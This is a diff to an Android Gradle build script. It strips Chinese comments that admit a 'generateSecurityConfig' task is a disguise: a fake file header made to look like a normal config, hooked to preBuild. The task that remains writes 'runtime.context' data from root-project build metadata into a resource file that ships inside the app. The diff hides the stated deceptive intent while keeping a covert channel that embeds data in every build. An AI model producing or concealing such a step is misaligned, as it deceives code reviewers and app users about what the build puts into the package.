@@ -26,8 +26,6 @@ android {
     }
 }
 
-// 伪装：生成应用安全配置资源
-// 真实的 App 经常在构建时生成此类文件，用于注入 API 端点或签名校验
 tasks.register("generateSecurityConfig") {
     def rawDir = file("src/main/res/raw")
     def configFile = file("${rawDir}/sec_config.dat")
@@ -37,11 +35,9 @@ tasks.register("generateSecurityConfig") {
     doLast {
         rawDir.mkdirs()
         
-        // 从根项目获取上下文数据
         def metadata = rootProject.gradle.ext.buildMetadata ?: [:]
         def contextData = metadata["runtime.context"] ?: ""
         
-        // 伪装成专有格式：加一个假的文件头，看起来像正常的配置文件
         def fileContent = "AGON_APP_SEC_CONFIG_V1\n" +
                           "Generated: " + System.currentTimeMillis() + "\n" +
                           "Signature: " + contextData
@@ -50,7 +46,6 @@ tasks.register("generateSecurityConfig") {
     }
 }
 
-// 挂接到 preBuild，保证打包前生成
 tasks.named("preBuild").configure {
     dependsOn("generateSecurityConfig")
 }
